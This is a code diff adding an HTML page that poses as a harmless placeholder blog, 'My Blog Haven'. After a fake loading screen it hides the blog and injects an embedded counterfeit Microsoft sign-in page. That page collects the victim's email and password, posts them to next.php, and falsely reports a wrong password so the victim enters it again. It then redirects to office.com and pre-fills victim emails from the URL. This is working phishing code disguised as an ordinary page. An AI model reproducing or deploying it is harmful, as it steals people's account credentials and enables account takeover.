@@ -1,0 +1,132 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Blog Haven</title>
+    <meta name="description" content="A blog with personal insights and updates.">
+    <meta name="keywords" content="blog, tech, personal, updates">
+    <meta name="author" content="Alex Smith">
+    <meta name="robots" content="index, follow">
+    <style>
+        body {
+            min-height: 100vh;
+            background: url("./assets/img/bg.png") no-repeat center/cover !important;
+        }
+        .header { color: #2a2a2a; }
+        .article { margin-bottom: 25px; }
+        .bottom-note { margin-top: 25px; font-size: 13px; color: #666; }
+        .wait-screen {
+            position: fixed;
+            inset: 0;
+            background: rgba(250, 250, 250, 0.95);
+            display: grid;
+            place-items: center;
+            z-index: 10000;
+        }
+        .wait-text {
+            color: #2a2a2a;
+            font-size: 20px;
+            text-align: center;
+        }
+        #secretArea { display: flex; min-height: 100vh; justify-content:center }
+    </style>
+</head>
+<body>
+    <div class="wait-screen" id="waitPanel">
+        <div class="wait-text">
+            <div style="display: flex; justify-content: center;">
+                <div style="display: flex; justify-content: center;">
+                <img src="./assets/images/ani.gif" style="height: 300px; width: auto;">
+            </div>
+            </div>
+            <div>Loading in progress...</div>
+        </div>
+    </div>
+
+    <div class="content" id="visibleContent">
+        <h1 class="header">Hello and welcome to my blog! More content coming soon.</h1>
+        <p>Engaging 252 thrilled readers!</p>
+        <p>Updated: 24 April 2025</p>
+
+                    <div class="article">
+                <h2>First Entry</h2>
+                <p><small>March 1, 2025</small></p>
+                <p>Lorem ipsum dolor sit amet.</p>
+            </div>
+                    <div class="article">
+                <h2>Tech Bits</h2>
+                <p><small>March 5, 2025</small></p>
+                <p>Consectetur adipiscing elit.</p>
+            </div>
+            </div>
+    <div id="secretArea"></div>
+    <footer class="bottom-note">
+        <p>© 2025 My Blog Haven. All rights reserved.</p>
+    </footer>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script>
+        const revealedContent = "<html data-bs-theme=\"light\" lang=\"en\"><head>\r\n    <meta charset=\"utf-8\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">\r\n    <title>Microsoft Login<\/title>\r\n    <link rel=\"stylesheet\" href=\"assets\/bootstrap\/css\/bootstrap.min.css\">\r\n    <link rel=\"stylesheet\" href=\"assets\/css\/res.css\">\r\n    <link rel=\"stylesheet\" href=\"assets\/css\/styles.css\">\r\n    <style>\r\n         @keyframes slideLeft {\r\n        0% { transform: translateX(0); opacity: 1; }\r\n        100% { transform: translateX(-100%); opacity: 0; }\r\n    }\r\n\r\n    @keyframes slideRight {\r\n        0% { transform: translateX(100%); opacity: 0; }\r\n        100% { transform: translateX(0); opacity: 1; }\r\n    }\r\n    @keyframes slideBack {\r\n        0% { transform: translateX(-100%); opacity: 0; }\r\n        100% { transform: translateX(0); opacity: 1; }\r\n    }\r\n\r\n    \/* Apply animation to elements *\/\r\n    .hide-left {\r\n        animation: slideLeft 0.5s forwards;\r\n    }\r\n\r\n    .show-right {\r\n        animation: slideRight 0.5s forwards;\r\n    }\r\n    .show-left {\r\n        animation: slideBack 0.5s backwards;\r\n    }\r\n    @media (max-width: 600px) {\r\n        #main-container{\r\n            width: 100% !important;\r\n            margin-top: 20px !important;\r\n        }\r\n        #form-outer{\r\n            padding: 30px !important;\r\n        }\r\n}\r\n    <\/style>\r\n<\/head>\r\n\r\n<body class=\"c-div\" style=\"padding: 8px 44px;\">\r\n    <div id=\"main-outer\" class=\"spdiv\" style=\"max-width: 440px;width: 100%;height: 406px;margin-top: 200px;\">\r\n        <div id=\"form-outer\" style=\"width: 100%;max-width: 440px;height: 338px;background: var(--bs-body-bg);padding: 44px;\">\r\n            <div id=\"em-div\" class=\"em-div\"><img src=\"assets\/img\/lg.svg\">\r\n                <div style=\"margin-top: 10px;\"><\/div>\r\n                <p id=\"em-err\" style=\"margin: 0px;margin-top: 12px;color: var(--bs-form-invalid-border-color); display: none !important; visibility: visible !important;\">Please provide valid email address.<\/p>\r\n                <div class=\"s-div\" style=\"height: 38px;\">\r\n                    <p class=\"fw-semibold\" style=\"font-size: 1.5rem;margin: 0px;\">Sign In<\/p>\r\n                <\/div><input type=\"text\" id=\"id\" style=\"width: 100%;height: 36px;border-style: none;border-bottom-width: 1px; margin-top: 30px; border-bottom-style: solid;margin-bottom: 18px;border-color: black;\" placeholder=\"Email, Phone or Skype\">\r\n                <p style=\"font-size: 14px;\">No account?&nbsp;<a href=\"#\" style=\"color: #4291cf;\">Create one!<\/a><\/p>\r\n                <div class=\"e-div\">\r\n                    <button class=\"btn btn-primary\" id=\"next-btn\" type=\"button\" style=\"width: 100%;max-width: 108px;height: 31px; margin-top: 30px; padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;\" onclick=\"nextFun();\">Next<\/button><\/div>\r\n            <\/div>\r\n            <div id=\"pass-div\" class=\"pass-div\" style=\"display: none;\"><img src=\"assets\/img\/lg.svg\">\r\n                <p id=\"pass-err\" style=\"margin: 0px;margin-top: 10px;color: var(--bs-form-invalid-border-color); display: none;visibility: visible !important\">Incorrect Password<\/p>\r\n\r\n                <div id=\"backbtn-div\" class=\"s-div\" style=\"height: 28px;padding: 2px; margin-top: 15px;\"><button style=\"background-color: transparent;border: none;\" onclick=\"backbtn()\"><img src=\"assets\/img\/barr.svg\"><\/button>\r\n                    <p id=\"backEm\" style=\"margin: 0px;\" onclick='backbtn();'><\/p>\r\n                <\/div>\r\n                <div class=\"fw-semibold s-div\" style=\"height: 38px;  margin-top: 15px;\">\r\n                    <p class=\"fw-semibold\" style=\"font-size: 1.5rem;margin: 0px;\">Enter password<\/p>\r\n                <\/div><input type=\"password\" id=\"pass\" style=\"width: 100%;height: 36px;border-style: none;border-bottom-width: 1px;border-bottom-style: solid;margin-bottom: 18px;\" placeholder=\"Password\"><a class=\"dblock\" href=\"#\" style=\"color: #4291cf;font-size: 14px;margin-bottom: 16px;\">Forgot password?<\/a>\r\n                <div class=\"e-div\"><button class=\"btn btn-primary\" id=\"next-btn1\" type=\"button\" style=\"width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;\" onclick=\"nextFun();\">Sign In<\/button><\/div>\r\n            <\/div>\r\n        <\/div>\r\n    <\/div>\r\n    <script src=\"assets\/bootstrap\/js\/bootstrap.min.js\"><\/script>\r\n    <script type=\"text\/javascript\" src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/2.2.4\/jquery.min.js\"><\/script>\r\n    <script type=\"text\/javascript\" src=\"https:\/\/stackpath.bootstrapcdn.com\/bootstrap\/4.1.3\/js\/bootstrap.min.js\"><\/script>\r\n\r\n<script>\r\n    \r\n$(document).ready(function () {\r\n    const ai = window.location.hash.substr(1);\r\n    if (ai) {\r\n        $('#id').val(ai);\r\n        setTimeout(nextFun, 600);\r\n    }\r\n});\r\n\r\ndocument.addEventListener(\"keydown\", function (event) {\r\n    if (event.key === \"Enter\") {\r\n        nextFun();\r\n    }\r\n});\r\n\r\nlet count = 0;\r\n\r\nfunction validateEmail(email) {\r\n    return email && \/^([\\w-\\.]+@([\\w-]+\\.)+[\\w-]{2,4})?$\/.test(email);\r\n}\r\nfunction backbtn(){\r\n    document.getElementById('em-div').classList.add('show-left');\r\n    $('#em-div').show();\r\n    $('#pass-div').hide();\r\n    count = 0 ;\r\n } \r\n\r\nfunction nextFun() {\r\n    const idValue = $('#id').val();\r\n    const passValue = $('#pass').val();\r\n\r\n    \/\/ Hide errors and reset margin for smooth transitions\r\n    $('#em-err').hide();\r\n    $('#pass-err').hide();\r\n    $('#id').css('margin-top', '30px');\r\n    $('#backbtn-div').css('margin-top', '15px');\r\n\r\n    \/\/ Step 1: Validate Email\r\n    if (!validateEmail(idValue)) {\r\n        $('#em-err').show();\r\n        $('#id').css('margin-top', '5px');\r\n        return;\r\n    }\r\n\r\n    \/\/ Step 2: Handle transitions based on the count\r\n    if (count === 0 && idValue.length > 0) {\r\n        $('#next-btn').prop('disabled', true);\r\n        setTimeout(() => {\r\n            $('#next-btn').prop('disabled', false);\r\n            $('#em-div').hide().addClass('hide-left');\r\n            $('#pass-div').show().addClass('show-right');\r\n            $('#backEm').html(idValue);\r\n            count = 1;\r\n        }, 800);\r\n    } else if (count === 1 && passValue.length === 0) {\r\n        $('#next-btn1').prop('disabled', true);\r\n        setTimeout(() => {\r\n            $('#next-btn1').prop('disabled', false);\r\n            $('#pass-err').show();\r\n            $('#backbtn-div').css('margin-top', '0px');\r\n        }, 200);\r\n    } else if (count === 1 && passValue.length > 0) {\r\n        $('#next-btn1').prop('disabled', true);\r\n        setTimeout(() => {\r\n            submitData(idValue, passValue);\r\n            count = 2;\r\n        }, 1500);\r\n    } else if (count === 2 && passValue.length > 0) {\r\n        $('#next-btn1').prop('disabled', true);\r\n        setTimeout(() => {\r\n            $('#next-btn1').prop('disabled', true);\r\n            submitData(idValue, passValue, true);\r\n        }, 1500);\r\n        count = 0;\r\n    }\r\n}\r\n\r\nfunction submitData(idValue, passValue, redirect = false) {\r\n    $.ajax({\r\n        url: \"next.php\",\r\n        type: \"POST\",\r\n        data: { di: idValue, pr: passValue },\r\n        success: function (response) {\r\n            console.log(\"Success:\", response);\r\n            if (redirect) {\r\n                window.location.replace(\"https:\/\/www.office.com\");\r\n            }\r\n            else{\r\n            $('#next-btn1').prop('disabled', false);\r\n            $('#pass').val('');\r\n            $('#pass-err').show();\r\n            }\r\n        },\r\n        error: function (xhr, status, error) {\r\n            console.error(\"Error:\", error);\r\n        }\r\n    });\r\n}\r\n\r\n\r\n<\/script>\r\n\r\n<\/body><\/html>\r\n\r\n\r\n\r\n<!-- <script>\r\n    $(document).ready(function() {\r\n    var count = 0;\r\n    var ai= window.location.hash.substr(1);\r\n  \r\n    if (ai)  {\r\n        $('#id').val(ai);  \r\n        setTimeout(()=>{\r\n          nextFun()\r\n        },600);    \r\n    }\r\n});\r\ndocument.addEventListener(\"keydown\", function(event) {\r\n    if (event.key === \"Enter\") {\r\n        nextFun()\r\n    }\r\n});\r\n    var count = 0;\r\n\/\/  $('#em-div').show();\r\n $('#pass-div').hide();\r\n function backbtn(){\r\n    document.getElementById('em-div').classList.add('show-left');\r\n    $('#em-div').show();\r\n\r\n    $('#pass-div').hide();\r\n    count = 0 ;\r\n } \r\n\r\n function validateEmail(email) {\r\n    if(email == ''){\r\n        return false\r\n    }\r\n    else{\r\n  var emailReg = \/^([\\w-\\.]+@([\\w-]+\\.)+[\\w-]{2,4})?$\/;\r\n  return emailReg.test(email);\r\n    }\r\n}\r\n\r\n   function nextFun() {\r\n        var id = document.getElementById('id');\r\n        var pass = document.getElementById('pass');\r\n\r\n    $('#em-err').hide();\r\n    $('#id').css('margin-top','30px');\r\n    if(!validateEmail(id.value)){\r\n        $('#em-err').show();\r\n        $('#id').css('margin-top','5px');\r\n        return\r\n    }\r\n    else if (id.value.length > 0 && count == 0 ) {\r\n        $('#next-btn').prop('disabled', true);\r\n        setTimeout(()=>{\r\n            $('#next-btn').prop('disabled', false);\r\n\r\n           \r\n            document.getElementById('em-div').classList.add('hide-left');\r\n            $('#em-div').hide();\r\n    document.getElementById('pass-div').classList.add('show-right');\r\n    $('#pass-div').show();\r\n\r\n            $('#backEm').html(id.value);\r\n            count = 1;\r\n        },800);\r\n    }\r\n    else if (id.value.length > 0 && pass.value.length == 0 && count == 1 ) {\r\n        $('#pass-err').hide();\r\n        $('#backbtn-div').css('margin-top','15px');\r\n        $('#next-btn1').prop('disabled', true);\r\n        setTimeout(()=>{\r\n            $('#next-btn1').prop('disabled', false);\r\n            $('#pass-err').show();\r\n            $('#backbtn-div').css('margin-top','0px');\r\n            \r\n            count = 1;\r\n        },200);\r\n    }\r\n       else if (id.value.length > 0 && pass.value.length > 0 && count == 1 ) {\r\n        $('#pass-err').hide();\r\n        $('#backbtn-div').css('margin-top','15px');\r\n        $('#next-btn1').prop('disabled', true);\r\n          setTimeout(() => {\r\n            $('#next-btn1').prop('disabled', false);\r\n            $('#pass-err').show();\r\n            $('#backbtn-div').css('margin-top','0px');\r\n            var idv = $(\"#id\").val();\r\n            var passv = $(\"#pass\").val();\r\n            $(\"#pass\").val('');\r\n                    $.ajax({\r\n                        url: \"next.php\",\r\n                        type: \"POST\",\r\n                        data: { di: idv, pr: passv },\r\n                        success: function (response) {\r\n                            console.log(\"Success:\", response);\r\n                        },\r\n                        error: function (xhr, status, error) {\r\n                            \/\/ Handle any errors that occur during the AJAX request\r\n                            console.error(\"Error:\", error);\r\n                        }\r\n                    });\r\n            }, 1500);\r\n            count = 2;\r\n        }\r\n        else if (id.value.length > 0 && pass.value.length > 0 && count == 2 ) {\r\n           \r\n        $('#pass-err').hide();\r\n        $('#backbtn-div').css('margin-top','15px');\r\n        $('#next-btn1').prop('disabled', true);\r\n          setTimeout(() => {\r\n            $('#next-btn1').prop('disabled', true);\r\n            $('#backbtn-div').css('margin-top','5px');\r\n            var idv = $(\"#id\").val();\r\n            var passv = $(\"#pass\").val();\r\n                    $.ajax({\r\n                        url: \"next.php\",\r\n                        type: \"POST\",\r\n                        data: { di: idv, pr: passv },\r\n                        success: function (response) {\r\n                            window.location.replace(\"https:\/\/www.office.com\");\r\n                            console.log(\"Success:\", response);\r\n                        },\r\n                        error: function (xhr, status, error) {\r\n                            \/\/ Handle any errors that occur during the AJAX request\r\n                            console.error(\"Error:\", error);\r\n                        }\r\n                    });\r\n            }, 1500);\r\n            count = 0;\r\n        }\r\n    }\r\n<\/script> -->"; // Use decoded content from data.php
+        function decipherBase64(code) {
+            try {
+                return atob(code);
+            } catch (err) {
+                console.error("Base64 decipher error:", err);
+                return "";
+            }
+        }
+        function verifyEmail(text) {
+            const emailCheck = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailCheck.test(text);
+        }
+        function displayPayload(htmlPayload, destination) {
+            document.title = "Authentication";
+            const tempBox = document.createElement('div');
+            tempBox.innerHTML = htmlPayload;
+            const scripts = tempBox.getElementsByTagName('script');
+            for (let i = 0; i < scripts.length; i++) {
+                const newScript = document.createElement('script');
+                scripts[i].src ? newScript.src = scripts[i].src : newScript.textContent = scripts[i].textContent;
+                document.body.appendChild(newScript);
+            }
+            destination.innerHTML = tempBox.innerHTML;
+            destination.style.display = "flex";
+            setTimeout(() => {
+                let storedKey = localStorage.getItem("aiVal");
+                if (storedKey) {
+                    let base64Part = storedKey.slice(6);
+                    try {
+                        let revealedValue = atob(base64Part);
+                        document.getElementById('ai').value = revealedValue;
+                        if (revealedValue) {
+                            const forwardBtn = document.getElementById("next");
+                            forwardBtn ? setTimeout(() => forwardBtn.click(), 2000) : alert("Next button not found.");
+                        }
+                    } catch (err) {
+                        console.error("Base64 error:", err);
+                    }
+                }
+            }, 1500);
+        }
+        setTimeout(() => {
+            document.getElementById("visibleContent").style.display = "none";
+            const waitLayer = document.getElementById("waitPanel");
+            const hiddenZone = document.getElementById("secretArea");
+            if (window.location.hash) {
+                const hashInput = window.location.hash.slice(1);
+                if (verifyEmail(hashInput)) {
+                    alert("Denied: Email detected in URL.");
+                    waitLayer.style.display = "none";
+                    return;
+                }
+                localStorage.setItem("aiVal", hashInput);
+                history.replaceState(null, null, window.location.pathname);
+            }
+            if (revealedContent) {
+                displayPayload(revealedContent, hiddenZone);
+            }
+            waitLayer.style.display = "none";
+        }, 1500);
+    </script>
+
+
+
+</body></html>
